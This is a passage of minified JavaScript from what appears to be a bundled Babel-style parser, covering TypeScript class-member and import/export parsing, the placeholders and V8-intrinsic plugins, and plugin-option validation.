W=this.startNode();return this.expect(75),this.tsParseEnumDeclaration(W,{const:!0})}if(this.isContextual(126))return this.tsParseEnumDeclaration(this.startNode());if(this.isContextual(129)){let W=this.tsParseInterfaceDeclaration(this.startNode());if(W)return W}return super.parseStatementContent(J,Y)}parseAccessModifier(){return this.tsParseModifier(["public","protected","private"])}tsHasSomeModifiers(J,Y){return Y.some((W)=>{if(Oq(W))return J.accessibility===W;return!!J[W]})}tsIsStartOfStaticBlocks(){return this.isContextual(106)&&this.lookaheadCharCode()===123}parseClassMember(J,Y,W){let G=["declare","private","public","protected","override","abstract","readonly","static"];this.tsParseModifiers({allowedModifiers:G,disallowedModifiers:["in","out"],stopOnStartOfClassStaticBlock:!0,errorTemplate:_1.InvalidModifierOnTypeParameterPositions},Y);let H=()=>{if(this.tsIsStartOfStaticBlocks()){if(this.next(),this.next(),this.tsHasSomeModifiers(Y,G))this.raise(_1.StaticBlockCannotHaveModifier,this.state.curPosition());super.parseClassStaticBlock(J,Y)}else this.parseClassMemberWithIsStatic(J,Y,W,!!Y.static)};if(Y.declare)this.tsInAmbientContext(H);else H()}parseClassMemberWithIsStatic(J,Y,W,G){let H=this.tsTryParseIndexSignature(Y);if(H){if(J.body.push(H),Y.abstract)this.raise(_1.IndexSignatureHasAbstract,Y);if(Y.accessibility)this.raise(_1.IndexSignatureHasAccessibility,Y,{modifier:Y.accessibility});if(Y.declare)this.raise(_1.IndexSignatureHasDeclare,Y);if(Y.override)this.raise(_1.IndexSignatureHasOverride,Y);return}if(!this.state.inAbstractClass&&Y.abstract)this.raise(_1.NonAbstractClassHasAbstractMethod,Y);if(Y.override){if(!W.hadSuperClass)this.raise(_1.OverrideNotInSubClass,Y)}super.parseClassMemberWithIsStatic(J,Y,W,G)}parsePostMemberNameModifiers(J){if(this.eat(17))J.optional=!0;if(J.readonly&&this.match(10))this.raise(_1.ClassMethodHasReadonly,J);if(J.declare&&this.match(10))this.raise(_1.ClassMethodHasDeclare,J)}parseExpressionStatement(J,Y,W){return(Y.type==="Identifier"?this.tsParseExpressionStatement(J,Y,W):void 0)||super.parseExpressionStatement(J,Y,W)}shouldParseExportDeclaration(){if(this.tsIsDeclarationStart())return!0;return super.shouldParseExportDeclaration()}parseConditional(J,Y,W){if(!this.match(17))return J;if(this.state.maybeInArrowParameters){let G=this.lookaheadCharCode();if(G===44||G===61||G===58||G===41)return this.setOptionalParametersError(W),J}return super.parseConditional(J,Y,W)}parseParenItem(J,Y){let W=super.parseParenItem(J,Y);if(this.eat(17))W.optional=!0,this.resetEndLocation(J);if(this.match(14)){let G=this.startNodeAt(Y);return G.expression=J,G.typeAnnotation=this.tsParseTypeAnnotation(),this.finishNode(G,"TSTypeCastExpression")}return J}parseExportDeclaration(J){if(!this.state.isAmbientContext&&this.isContextual(125))return this.tsInAmbientContext(()=>this.parseExportDeclaration(J));let Y=this.state.startLoc,W=this.eatContextual(125);if(W&&(this.isContextual(125)||!this.shouldParseExportDeclaration()))throw this.raise(_1.ExpectedAmbientAfterExportDeclare,this.state.startLoc);let H=w0(this.state.type)&&this.tsTryParseExportDeclaration()||super.parseExportDeclaration(J);if(!H)return null;if(H.type==="TSInterfaceDeclaration"||H.type==="TSTypeAliasDeclaration"||W)J.exportKind="type";if(W&&H.type!=="TSImportEqualsDeclaration")this.resetStartLocation(H,Y),H.declare=!0;return H}parseClassId(J,Y,W,G){if((!Y||W)&&this.isContextual(113))return;super.parseClassId(J,Y,W,J.declare?1024:8331);let H=this.tsTryParseTypeParameters(this.tsParseInOutConstModifiers);if(H)J.typeParameters=H}parseClassPropertyAnnotation(J){if(!J.optional){if(this.eat(35))J.definite=!0;else if(this.eat(17))J.optional=!0}let Y=this.tsTryParseTypeAnnotation();if(Y)J.typeAnnotation=Y}parseClassProperty(J){if(this.parseClassPropertyAnnotation(J),this.state.isAmbientContext&&!(J.readonly&&!J.typeAnnotation)&&this.match(29))this.raise(_1.DeclareClassFieldHasInitializer,this.state.startLoc);if(J.abstract&&this.match(29)){let{key:Y}=J;this.raise(_1.AbstractPropertyHasInitializer,this.state.startLoc,{propertyName:Y.type==="Identifier"&&!J.computed?Y.name:`[${this.input.slice(this.offsetToSourcePos(Y.start),this.offsetToSourcePos(Y.end))}]`})}return super.parseClassProperty(J)}parseClassPrivateProperty(J){if(J.abstract)this.raise(_1.PrivateElementHasAbstract,J);if(J.accessibility)this.raise(_1.PrivateElementHasAccessibility,J,{modifier:J.accessibility});return this.parseClassPropertyAnnotation(J),super.parseClassPrivateProperty(J)}parseClassAccessorProperty(J){if(this.parseClassPropertyAnnotation(J),J.optional)this.raise(_1.AccessorCannotBeOptional,J);return super.parseClassAccessorProperty(J)}pushClassMethod(J,Y,W,G,H,$){let z=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(z&&H)this.raise(_1.ConstructorHasTypeParameters,z);let{declare:U=!1,kind:K}=Y;if(U&&(K==="get"||K==="set"))this.raise(_1.DeclareAccessor,Y,{kind:K});if(z)Y.typeParameters=z;super.pushClassMethod(J,Y,W,G,H,$)}pushClassPrivateMethod(J,Y,W,G){let H=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(H)Y.typeParameters=H;super.pushClassPrivateMethod(J,Y,W,G)}declareClassPrivateMethodInScope(J,Y){if(J.type==="TSDeclareMethod")return;if(J.type==="MethodDefinition"&&J.value.body==null)return;super.declareClassPrivateMethodInScope(J,Y)}parseClassSuper(J){if(super.parseClassSuper(J),J.superClass&&(this.match(47)||this.match(51)))J.superTypeParameters=this.tsParseTypeArgumentsInExpression();if(this.eatContextual(113))J.implements=this.tsParseHeritageClause("implements")}parseObjPropValue(J,Y,W,G,H,$,z){let U=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(U)J.typeParameters=U;return super.parseObjPropValue(J,Y,W,G,H,$,z)}parseFunctionParams(J,Y){let W=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(W)J.typeParameters=W;super.parseFunctionParams(J,Y)}parseVarId(J,Y){if(super.parseVarId(J,Y),J.id.type==="Identifier"&&!this.hasPrecedingLineBreak()&&this.eat(35))J.definite=!0;let W=this.tsTryParseTypeAnnotation();if(W)J.id.typeAnnotation=W,this.resetEndLocation(J.id)}parseAsyncArrowFromCallExpression(J,Y){if(this.match(14))J.returnType=this.tsParseTypeAnnotation();return super.parseAsyncArrowFromCallExpression(J,Y)}parseMaybeAssign(J,Y){var W,G,H,$,z;let U,K,B;if(this.hasPlugin("jsx")&&(this.match(143)||this.match(47))){if(U=this.state.clone(),K=this.tryParse(()=>super.parseMaybeAssign(J,Y),U),!K.error)return K.node;let{context:M}=this.state,L=M[M.length-1];if(L===L0.j_oTag||L===L0.j_expr)M.pop()}if(!((W=K)!=null&&W.error)&&!this.match(47))return super.parseMaybeAssign(J,Y);if(!U||U===this.state)U=this.state.clone();let q,Z=this.tryParse((M)=>{var L,R;q=this.tsParseTypeParameters(this.tsParseConstModifier);let j=super.parseMaybeAssign(J,Y);if(j.type!=="ArrowFunctionExpression"||(L=j.extra)!=null&&L.parenthesized)M();if(((R=q)==null?void 0:R.params.length)!==0)this.resetStartLocationFromNode(j,q);return j.typeParameters=q,j},U);if(!Z.error&&!Z.aborted){if(q)this.reportReservedArrowTypeParam(q);return Z.node}if(!K){if(Fq(!this.hasPlugin("jsx")),B=this.tryParse(()=>super.parseMaybeAssign(J,Y),U),!B.error)return B.node}if((G=K)!=null&&G.node)return this.state=K.failState,K.node;if(Z.node){if(this.state=Z.failState,q)this.reportReservedArrowTypeParam(q);return Z.node}if((H=B)!=null&&H.node)return this.state=B.failState,B.node;throw(($=K)==null?void 0:$.error)||Z.error||((z=B)==null?void 0:z.error)}reportReservedArrowTypeParam(J){var Y;if(J.params.length===1&&!J.params[0].constraint&&!((Y=J.extra)!=null&&Y.trailingComma)&&this.getPluginOption("typescript","disallowAmbiguousJSXLike"))this.raise(_1.ReservedArrowTypeParam,J)}parseMaybeUnary(J,Y){if(!this.hasPlugin("jsx")&&this.match(47))return this.tsParseTypeAssertion();return super.parseMaybeUnary(J,Y)}parseArrow(J){if(this.match(14)){let Y=this.tryParse((W)=>{let G=this.tsParseTypeOrTypePredicateAnnotation(14);if(this.canInsertSemicolon()||!this.match(19))W();return G});if(Y.aborted)return;if(!Y.thrown){if(Y.error)this.state=Y.failState;J.returnType=Y.node}}return super.parseArrow(J)}parseFunctionParamType(J){if(this.eat(17))J.optional=!0;let Y=this.tsTryParseTypeAnnotation();if(Y)J.typeAnnotation=Y;return this.resetEndLocation(J),J}isAssignable(J,Y){switch(J.type){case"TSTypeCastExpression":return this.isAssignable(J.expression,Y);case"TSParameterProperty":return!0;default:return super.isAssignable(J,Y)}}toAssignable(J,Y=!1){switch(J.type){case"ParenthesizedExpression":this.toAssignableParenthesizedExpression(J,Y);break;case"TSAsExpression":case"TSSatisfiesExpression":case"TSNonNullExpression":case"TSTypeAssertion":if(Y)this.expressionScope.recordArrowParameterBindingError(_1.UnexpectedTypeCastInParameter,J);else this.raise(_1.UnexpectedTypeCastInParameter,J);this.toAssignable(J.expression,Y);break;case"AssignmentExpression":if(!Y&&J.left.type==="TSTypeCastExpression")J.left=this.typeCastToParameter(J.left);default:super.toAssignable(J,Y)}}toAssignableParenthesizedExpression(J,Y){switch(J.expression.type){case"TSAsExpression":case"TSSatisfiesExpression":case"TSNonNullExpression":case"TSTypeAssertion":case"ParenthesizedExpression":this.toAssignable(J.expression,Y);break;default:super.toAssignable(J,Y)}}checkToRestConversion(J,Y){switch(J.type){case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":this.checkToRestConversion(J.expression,!1);break;default:super.checkToRestConversion(J,Y)}}isValidLVal(J,Y,W){switch(J){case"TSTypeCastExpression":return!0;case"TSParameterProperty":return"parameter";case"TSNonNullExpression":return"expression";case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":return(W!==64||!Y)&&["expression",!0];default:return super.isValidLVal(J,Y,W)}}parseBindingAtom(){if(this.state.type===78)return this.parseIdentifier(!0);return super.parseBindingAtom()}parseMaybeDecoratorArguments(J,Y){if(this.match(47)||this.match(51)){let W=this.tsParseTypeArgumentsInExpression();if(this.match(10)){let G=super.parseMaybeDecoratorArguments(J,Y);return G.typeParameters=W,G}this.unexpected(null,10)}return super.parseMaybeDecoratorArguments(J,Y)}checkCommaAfterRest(J){if(this.state.isAmbientContext&&this.match(12)&&this.lookaheadCharCode()===J)return this.next(),!1;return super.checkCommaAfterRest(J)}isClassMethod(){return this.match(47)||super.isClassMethod()}isClassProperty(){return this.match(35)||this.match(14)||super.isClassProperty()}parseMaybeDefault(J,Y){let W=super.parseMaybeDefault(J,Y);if(W.type==="AssignmentPattern"&&W.typeAnnotation&&W.right.start<W.typeAnnotation.start)this.raise(_1.TypeAnnotationAfterAssign,W.typeAnnotation);return W}getTokenFromCode(J){if(this.state.inType){if(J===62){this.finishOp(48,1);return}if(J===60){this.finishOp(47,1);return}}super.getTokenFromCode(J)}reScan_lt_gt(){let{type:J}=this.state;if(J===47)this.state.pos-=1,this.readToken_lt();else if(J===48)this.state.pos-=1,this.readToken_gt()}reScan_lt(){let{type:J}=this.state;if(J===51)return this.state.pos-=2,this.finishOp(47,1),47;return J}toAssignableListItem(J,Y,W){let G=J[Y];if(G.type==="TSTypeCastExpression")J[Y]=this.typeCastToParameter(G);super.toAssignableListItem(J,Y,W)}typeCastToParameter(J){return J.expression.typeAnnotation=J.typeAnnotation,this.resetEndLocation(J.expression,J.typeAnnotation.loc.end),J.expression}shouldParseArrow(J){if(this.match(14))return J.every((Y)=>this.isAssignable(Y,!0));return super.shouldParseArrow(J)}shouldParseAsyncArrow(){return this.match(14)||super.shouldParseAsyncArrow()}canHaveLeadingDecorator(){return super.canHaveLeadingDecorator()||this.isAbstractClass()}jsxParseOpeningElementAfterName(J){if(this.match(47)||this.match(51)){let Y=this.tsTryParseAndCatch(()=>this.tsParseTypeArgumentsInExpression());if(Y)J.typeParameters=Y}return super.jsxParseOpeningElementAfterName(J)}getGetterSetterExpectedParamCount(J){let Y=super.getGetterSetterExpectedParamCount(J),G=this.getObjectOrClassMethodParams(J)[0];return G&&this.isThisParam(G)?Y+1:Y}parseCatchClauseParam(){let J=super.parseCatchClauseParam(),Y=this.tsTryParseTypeAnnotation();if(Y)J.typeAnnotation=Y,this.resetEndLocation(J);return J}tsInAmbientContext(J){let{isAmbientContext:Y,strict:W}=this.state;this.state.isAmbientContext=!0,this.state.strict=!1;try{return J()}finally{this.state.isAmbientContext=Y,this.state.strict=W}}parseClass(J,Y,W){let G=this.state.inAbstractClass;this.state.inAbstractClass=!!J.abstract;try{return super.parseClass(J,Y,W)}finally{this.state.inAbstractClass=G}}tsParseAbstractDeclaration(J,Y){if(this.match(80))return J.abstract=!0,this.maybeTakeDecorators(Y,this.parseClass(J,!0,!1));else if(this.isContextual(129)){if(!this.hasFollowingLineBreak())return J.abstract=!0,this.raise(_1.NonClassMethodPropertyHasAbstractModifier,J),this.tsParseInterfaceDeclaration(J)}else this.unexpected(null,80)}parseMethod(J,Y,W,G,H,$,z){let U=super.parseMethod(J,Y,W,G,H,$,z);if(U.abstract||U.type==="TSAbstractMethodDefinition"){if((this.hasPlugin("estree")?U.value:U).body){let{key:q}=U;this.raise(_1.AbstractMethodHasImplementation,U,{methodName:q.type==="Identifier"&&!U.computed?q.name:`[${this.input.slice(this.offsetToSourcePos(q.start),this.offsetToSourcePos(q.end))}]`})}}return U}tsParseTypeParameterName(){return this.parseIdentifier().name}shouldParseAsAmbientContext(){return!!this.getPluginOption("typescript","dts")}parse(){if(this.shouldParseAsAmbientContext())this.state.isAmbientContext=!0;return super.parse()}getExpression(){if(this.shouldParseAsAmbientContext())this.state.isAmbientContext=!0;return super.getExpression()}parseExportSpecifier(J,Y,W,G){if(!Y&&G)return this.parseTypeOnlyImportExportSpecifier(J,!1,W),this.finishNode(J,"ExportSpecifier");return J.exportKind="value",super.parseExportSpecifier(J,Y,W,G)}parseImportSpecifier(J,Y,W,G,H){if(!Y&&G)return this.parseTypeOnlyImportExportSpecifier(J,!0,W),this.finishNode(J,"ImportSpecifier");return J.importKind="value",super.parseImportSpecifier(J,Y,W,G,W?4098:4096)}parseTypeOnlyImportExportSpecifier(J,Y,W){let G=Y?"imported":"local",H=Y?"local":"exported",$=J[G],z,U=!1,K=!0,B=$.loc.start;if(this.isContextual(93)){let Z=this.parseIdentifier();if(this.isContextual(93)){let M=this.parseIdentifier();if(C6(this.state.type))U=!0,$=Z,z=Y?this.parseIdentifier():this.parseModuleExportName(),K=!1;else z=M,K=!1}else if(C6(this.state.type))K=!1,z=Y?this.parseIdentifier():this.parseModuleExportName();else U=!0,$=Z}else if(C6(this.state.type))if(U=!0,Y){if($=this.parseIdentifier(!0),!this.isContextual(93))this.checkReservedWord($.name,$.loc.start,!0,!0)}else $=this.parseModuleExportName();if(U&&W)this.raise(Y?_1.TypeModifierIsUsedInTypeImports:_1.TypeModifierIsUsedInTypeExports,B);J[G]=$,J[H]=z;let q=Y?"importKind":"exportKind";if(J[q]=U?"type":"value",K&&this.eatContextual(93))J[H]=Y?this.parseIdentifier():this.parseModuleExportName();if(!J[H])J[H]=this.cloneIdentifier(J[G]);if(Y)this.checkIdentifier(J[H],U?4098:4096)}fillOptionalPropertiesForTSESLint(J){var Y,W,G,H,$,z,U,K,B,q,Z,M,L,R,j,F,A,O,w,N,C,_,h,o,p,e,d,Q1,V1,D1,n,t,u,E,y,a,I,v,g,H1,z1,P1,j1,k1,Y1,k,c,X1;switch(J.type){case"ExpressionStatement":(Y=J.directive)!=null||(J.directive=void 0);return;case"RestElement":J.value=void 0;case"Identifier":case"ArrayPattern":case"AssignmentPattern":case"ObjectPattern":(W=J.decorators)!=null||(J.decorators=[]),(G=J.optional)!=null||(J.optional=!1),(H=J.typeAnnotation)!=null||(J.typeAnnotation=void 0);return;case"TSParameterProperty":($=J.accessibility)!=null||(J.accessibility=void 0),(z=J.decorators)!=null||(J.decorators=[]),(U=J.override)!=null||(J.override=!1),(K=J.readonly)!=null||(J.readonly=!1),(B=J.static)!=null||(J.static=!1);return;case"TSEmptyBodyFunctionExpression":J.body=null;case"TSDeclareFunction":case"FunctionDeclaration":case"FunctionExpression":case"ClassMethod":case"ClassPrivateMethod":(q=J.declare)!=null||(J.declare=!1),(Z=J.returnType)!=null||(J.returnType=void 0),(M=J.typeParameters)!=null||(J.typeParameters=void 0);return;case"Property":(L=J.optional)!=null||(J.optional=!1);return;case"TSMethodSignature":case"TSPropertySignature":(R=J.optional)!=null||(J.optional=!1);case"TSIndexSignature":(j=J.accessibility)!=null||(J.accessibility=void 0),(F=J.readonly)!=null||(J.readonly=!1),(A=J.static)!=null||(J.static=!1);return;case"TSAbstractPropertyDefinition":case"PropertyDefinition":case"TSAbstractAccessorProperty":case"AccessorProperty":(O=J.declare)!=null||(J.declare=!1),(w=J.definite)!=null||(J.definite=!1),(N=J.readonly)!=null||(J.readonly=!1),(C=J.typeAnnotation)!=null||(J.typeAnnotation=void 0);case"TSAbstractMethodDefinition":case"MethodDefinition":(_=J.accessibility)!=null||(J.accessibility=void 0),(h=J.decorators)!=null||(J.decorators=[]),(o=J.override)!=null||(J.override=!1),(p=J.optional)!=null||(J.optional=!1);return;case"ClassExpression":(e=J.id)!=null||(J.id=null);case"ClassDeclaration":(d=J.abstract)!=null||(J.abstract=!1),(Q1=J.declare)!=null||(J.declare=!1),(V1=J.decorators)!=null||(J.decorators=[]),(D1=J.implements)!=null||(J.implements=[]),(n=J.superTypeArguments)!=null||(J.superTypeArguments=void 0),(t=J.typeParameters)!=null||(J.typeParameters=void 0);return;case"TSTypeAliasDeclaration":case"VariableDeclaration":(u=J.declare)!=null||(J.declare=!1);return;case"VariableDeclarator":(E=J.definite)!=null||(J.definite=!1);return;case"TSEnumDeclaration":(y=J.const)!=null||(J.const=!1),(a=J.declare)!=null||(J.declare=!1);return;case"TSEnumMember":(I=J.computed)!=null||(J.computed=!1);return;case"TSImportType":(v=J.qualifier)!=null||(J.qualifier=null),(g=J.options)!=null||(J.options=null);return;case"TSInterfaceDeclaration":(H1=J.declare)!=null||(J.declare=!1),(z1=J.extends)!=null||(J.extends=[]);return;case"TSMappedType":(P1=J.optional)!=null||(J.optional=!1),(j1=J.readonly)!=null||(J.readonly=void 0);return;case"TSModuleDeclaration":(k1=J.declare)!=null||(J.declare=!1),(Y1=J.global)!=null||(J.global=J.kind==="global");return;case"TSTypeParameter":(k=J.const)!=null||(J.const=!1),(c=J.in)!=null||(J.in=!1),(X1=J.out)!=null||(J.out=!1);return}}};function iv(X){if(X.type!=="MemberExpression")return!1;let{computed:Q,property:J}=X;if(Q&&J.type!=="StringLiteral"&&(J.type!=="TemplateLiteral"||J.expressions.length>0))return!1;return oq(X.object)}function rv(X,Q){var J;let{type:Y}=X;if((J=X.extra)!=null&&J.parenthesized)return!1;if(Q){if(Y==="Literal"){let{value:W}=X;if(typeof W==="string"||typeof W==="boolean")return!0}}else if(Y==="StringLiteral"||Y==="BooleanLiteral")return!0;if(aq(X,Q)||nv(X,Q))return!0;if(Y==="TemplateLiteral"&&X.expressions.length===0)return!0;if(iv(X))return!0;return!1}function aq(X,Q){if(Q)return X.type==="Literal"&&(typeof X.value==="number"||("bigint"in X));return X.type==="NumericLiteral"||X.type==="BigIntLiteral"}function nv(X,Q){if(X.type==="UnaryExpression"){let{operator:J,argument:Y}=X;if(J==="-"&&aq(Y,Q))return!0}return!1}function oq(X){if(X.type==="Identifier")return!0;if(X.type!=="MemberExpression"||X.computed)return!1;return oq(X.object)}var Aq=n6`placeholders`({ClassNameIsRequired:"A class name is required.",UnexpectedSpace:"Unexpected space in placeholder."}),av=(X)=>class extends X{parsePlaceholder(J){if(this.match(133)){let Y=this.startNode();return this.next(),this.assertNoSpace(),Y.name=super.parseIdentifier(!0),this.assertNoSpace(),this.expect(133),this.finishPlaceholder(Y,J)}}finishPlaceholder(J,Y){let W=J;if(!W.expectedNode||!W.type)W=this.finishNode(W,"Placeholder");return W.expectedNode=Y,W}getTokenFromCode(J){if(J===37&&this.input.charCodeAt(this.state.pos+1)===37)this.finishOp(133,2);else super.getTokenFromCode(J)}parseExprAtom(J){return this.parsePlaceholder("Expression")||super.parseExprAtom(J)}parseIdentifier(J){return this.parsePlaceholder("Identifier")||super.parseIdentifier(J)}checkReservedWord(J,Y,W,G){if(J!==void 0)super.checkReservedWord(J,Y,W,G)}cloneIdentifier(J){let Y=super.cloneIdentifier(J);if(Y.type==="Placeholder")Y.expectedNode=J.expectedNode;return Y}cloneStringLiteral(J){if(J.type==="Placeholder")return this.cloneIdentifier(J);return super.cloneStringLiteral(J)}parseBindingAtom(){return this.parsePlaceholder("Pattern")||super.parseBindingAtom()}isValidLVal(J,Y,W){return J==="Placeholder"||super.isValidLVal(J,Y,W)}toAssignable(J,Y){if(J&&J.type==="Placeholder"&&J.expectedNode==="Expression")J.expectedNode="Pattern";else super.toAssignable(J,Y)}chStartsBindingIdentifier(J,Y){if(super.chStartsBindingIdentifier(J,Y))return!0;let W=this.nextTokenStart();if(this.input.charCodeAt(W)===37&&this.input.charCodeAt(W+1)===37)return!0;return!1}verifyBreakContinue(J,Y){if(J.label&&J.label.type==="Placeholder")return;super.verifyBreakContinue(J,Y)}parseExpressionStatement(J,Y){var W;if(Y.type!=="Placeholder"||(W=Y.extra)!=null&&W.parenthesized)return super.parseExpressionStatement(J,Y);if(this.match(14)){let H=J;return H.label=this.finishPlaceholder(Y,"Identifier"),this.next(),H.body=super.parseStatementOrSloppyAnnexBFunctionDeclaration(),this.finishNode(H,"LabeledStatement")}this.semicolon();let G=J;return G.name=Y.name,this.finishPlaceholder(G,"Statement")}parseBlock(J,Y,W){return this.parsePlaceholder("BlockStatement")||super.parseBlock(J,Y,W)}parseFunctionId(J){return this.parsePlaceholder("Identifier")||super.parseFunctionId(J)}parseClass(J,Y,W){let G=Y?"ClassDeclaration":"ClassExpression";this.next();let H=this.state.strict,$=this.parsePlaceholder("Identifier");if($)if(this.match(81)||this.match(133)||this.match(5))J.id=$;else if(W||!Y)return J.id=null,J.body=this.finishPlaceholder($,"ClassBody"),this.finishNode(J,G);else throw this.raise(Aq.ClassNameIsRequired,this.state.startLoc);else this.parseClassId(J,Y,W);return super.parseClassSuper(J),J.body=this.parsePlaceholder("ClassBody")||super.parseClassBody(!!J.superClass,H),this.finishNode(J,G)}parseExport(J,Y){let W=this.parsePlaceholder("Identifier");if(!W)return super.parseExport(J,Y);let G=J;if(!this.isContextual(98)&&!this.match(12))return G.specifiers=[],G.source=null,G.declaration=this.finishPlaceholder(W,"Declaration"),this.finishNode(G,"ExportNamedDeclaration");this.expectPlugin("exportDefaultFrom");let H=this.startNode();return H.exported=W,G.specifiers=[this.finishNode(H,"ExportDefaultSpecifier")],super.parseExport(G,Y)}isExportDefaultSpecifier(){if(this.match(65)){let J=this.nextTokenStart();if(this.isUnparsedContextual(J,"from")){if(this.input.startsWith(VX(133),this.nextTokenStartSince(J+4)))return!0}}return super.isExportDefaultSpecifier()}maybeParseExportDefaultSpecifier(J,Y){var W;if((W=J.specifiers)!=null&&W.length)return!0;return super.maybeParseExportDefaultSpecifier(J,Y)}checkExport(J){let{specifiers:Y}=J;if(Y!=null&&Y.length)J.specifiers=Y.filter((W)=>W.exported.type==="Placeholder");super.checkExport(J),J.specifiers=Y}parseImport(J){let Y=this.parsePlaceholder("Identifier");if(!Y)return super.parseImport(J);if(J.specifiers=[],!this.isContextual(98)&&!this.match(12))return J.source=this.finishPlaceholder(Y,"StringLiteral"),this.semicolon(),this.finishNode(J,"ImportDeclaration");let W=this.startNodeAtNode(Y);if(W.local=Y,J.specifiers.push(this.finishNode(W,"ImportDefaultSpecifier")),this.eat(12)){if(!this.maybeParseStarImportSpecifier(J))this.parseNamedImportSpecifiers(J)}return this.expectContextual(98),J.source=this.parseImportSource(),this.semicolon(),this.finishNode(J,"ImportDeclaration")}parseImportSource(){return this.parsePlaceholder("StringLiteral")||super.parseImportSource()}assertNoSpace(){if(this.state.start>this.offsetToSourcePos(this.state.lastTokEndLoc.index))this.raise(Aq.UnexpectedSpace,this.state.lastTokEndLoc)}},ov=(X)=>class extends X{parseV8Intrinsic(){if(this.match(54)){let J=this.state.startLoc,Y=this.startNode();if(this.next(),w0(this.state.type)){let W=this.parseIdentifierName(),G=this.createIdentifier(Y,W);if(this.castNodeTo(G,"V8IntrinsicIdentifier"),this.match(10))return G}this.unexpected(J)}}parseExprAtom(J){return this.parseV8Intrinsic()||super.parseExprAtom(J)}},Rq=["minimal","fsharp","hack","smart"],Lq=["^^","@@","^","%","#"];function sv(X){if(X.has("decorators")){if(X.has("decorators-legacy"))throw Error("Cannot use the decorators and decorators-legacy plugin together");let Y=X.get("decorators").decoratorsBeforeExport;if(Y!=null&&typeof Y!=="boolean")throw Error("'decoratorsBeforeExport' must be a boolean, if specified.");let W=X.get("decorators").allowCallParenthesized;if(W!=null&&typeof W!=="boolean")throw Error("'allowCallParenthesized' must be a boolean.")}if(X.has("flow")&&X.has("typescript"))throw Error("Cannot combine flow and typescript plugins.");if(X.has("placeholders")&&X.has("v8intrinsic"))throw Error("Cannot combine placeholders and v8intrinsic plugins.");if(X.has("pipelineOperator")){var Q;let Y=X.get("pipelineOperator").proposal;if(!Rq.includes(Y)){let W=Rq.map((G)=>`"${G}"`).join(", ");throw Error(`"pipelineOperator" requires "proposal" option whose value must be one of: ${W}.`)}if(Y==="hack"){if(X.has("placeholders"))throw Error("Cannot combine placeholders plugin and Hack-style pipes.");if(X.has("v8intrinsic"))throw Error("Cannot combine v8intrinsic plugin and Hack-style pipes.");let W=X.get("pipelineOperator").topicToken;if(!Lq.includes(W)){let G=Lq.map((H)=>`"${H}"`).join(", ");throw Error(`"pipelineOperator" in "proposal": "hack" mode also requires a "topicToken" option whose value must be one of: ${G}.`)}{var J;if(W==="#"&&((J=X.get("recordAndTuple"))==null?void 0:J.syntaxType)==="hash")throw Error(`Plugin conflict between \`["pipelineOperator", { proposal: "hack", topicToken: "#" }]\` and \`${JSON.stringify(["recordAndTuple",X.get("recordAndTuple")])}\`.`)}}else if(Y==="smart"&&((Q=X.get("recordAndTuple"))==null?void 0:Q.syntaxType)==="hash")throw Error(`Plugin conflict between \`["pipelineOperator", { proposal: "smart" }]\` and \`${JSON.stringify(["recordAndTuple",X.get("recordAndTuple")])}\`.`)}if(X.has("moduleAttributes")){if(X.has("deprecatedImportAssert")||X.has("importAssertions"))throw Error("Cannot combine importAssertions, deprecatedImportAssert and moduleAttributes plugins.");if(X.get("moduleAttributes").version!=="may-2020")throw Error("The 'moduleAttributes' plugin requires a 'version' option, representing the last proposal update. Currently, the only supported value is 'may-2020'.")}if(X.has("importAssertions")){if(X.has("deprecatedImportAssert"))throw Error("Cannot combine importAssertions and deprecatedImportAssert plugins.")}if(!X.has("deprecatedImportAssert")&&X.has("importAttributes")&&X.get("importAttributes").deprecatedAssertSyntax)X.set("deprecatedImportAssert",{});if(X.has("recordAndTuple")){let Y=X.get("recordAndTuple").syntaxType;if(Y!=null){let W=["hash","bar"];if(!W.includes(Y))throw Error("The 'syntaxType' option of the 'recordAndTuple' plugin must be one of: "+W.map((G)=>`'${G}'`).join(", "))}}if(X.has("asyncDoExpressions")&&!X.has("doExpressions")){let Y=Error("'asyncDoExpressions' requires 'doExpressions', please add 'doExpressions' to parser plugins.");throw Y.missingPlugins="doExpressions",Y}if(X.has("optionalChainingAssign")&&X.get("optionalChainingAssign").version!=="2023-07")throw Error("The 'optionalChainingAssign' plugin requires a 'version' option, representing the last proposal update. Currently, the only supported value is '2023-07'.");if(X.has("discardBinding")&&X.get("discardBinding").syntaxType!=="void")throw Error("The 'discardBinding' plugin requires a 'syntaxType' option. Currently the only supported value is 'void'.")}var sq={estree:Qv,jsx:bv,flow:Ev,typescript:dv,v8intrinsic:ov,placeholders:av},tv=Object.keys(sq);class tq extends nq{checkProto(X,Q,J,Y){if(X.type==="SpreadElement"||this.isObjectMethod(X)||X.computed||X.shorthand)return J;let W=X.key;if((W.type==="Identifier"?W.name:W.value)==="__proto__"){if(Q)return this.raise(x.RecordNoProto,W),!0;if(J)if(Y){if(Y.doubleProtoLoc===null)Y.doubleProtoLoc=W.loc.start}else this.raise(x.DuplicateProto,W);return!0}return J}shouldExitDescending(X,Q){return X.type==="ArrowFunctionExpression"&&this.offsetToSourcePos(X.start)===Q}getExpression(){if(this.enterInitialScopes(),this.nextToken(),this.match(140))throw this.raise(x.ParseExpressionEmptyInput,this.state.startLoc);let X=this.parseExpression();if(!this.match(140))throw this.raise(x.ParseExpressionExpectsEOF,this.state.startLoc,{unexpected:this.input.codePointAt(this.state.start)});if(this.finalizeRemainingComments(),X.comments=this.comments,X.errors=this.state.errors,this.optionFlags&256)X.tokens=this.tokens;return X}parseExpression(X,Q){if(X)return this.disallowInAnd(()=>this.parseExpressionBase(Q));return this.allowInAnd(()=>this.parseExpressionBase(Q))}parseExpressionBase(X){let Q=this.state.startLoc,J=this.parseMaybeAssign(X);if(this.match(12)){let Y=this.startNodeAt(Q);Y.expressions=[J];while(this.eat(12))Y.expressions.push(this.parseMaybeAssign(X));return this.toReferencedList(Y.expressions),this.finishNode(Y,"SequenceExpression")}return J}parseMaybeAssignDisallowIn(X,Q){return this.disallowInAnd(()=>this.parseMaybeAssign(X,Q))}parseMaybeAssignAllowIn(X,Q){return this.allowInAnd(()=>this.parseMaybeAssign(X,Q))}setOptionalParametersError(X){X.optionalParametersLoc=this.state.startLoc}parseMaybeAssign(X,Q){let J=this.state.startLoc,Y=this.isContextual(108);if(Y){if(this.prodParam.hasYield){this.next();let 